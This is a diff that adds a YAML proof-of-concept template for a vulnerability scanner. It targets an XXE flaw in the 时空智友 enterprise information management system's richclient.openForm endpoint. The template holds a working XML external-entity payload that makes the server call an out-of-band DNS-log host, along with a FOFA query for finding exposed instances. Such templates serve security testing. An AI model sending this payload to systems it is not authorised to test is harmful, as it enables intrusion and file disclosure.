@@ -1,0 +1,25 @@
+id: poc-yaml-skzy-eims-richclient-openform-anyfile-read
+info:
+  name: 时空智友企业信息管理系统 richclient.openForm XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 时空智友企业信息管理系统
+  fofa: body="时空智友企业信息管理"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /formservice?service=richclient.openForm
+  headers:
+    Content-Type: application/xml
+  data: '<?xml version="1.0" encoding="UTF-8" ?>
+
+    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://{{.domain}}">]>
+
+    <xxx>&xxe;</xxx>'
+  expression: status_code == 200 && contains(body,"<errmsg>") && contains(body,"richclient.openForm")
+    && contains(body,"提交数据格式有误") && contains(content_type,"text/xml") && reverse.Verify()
+transport: http
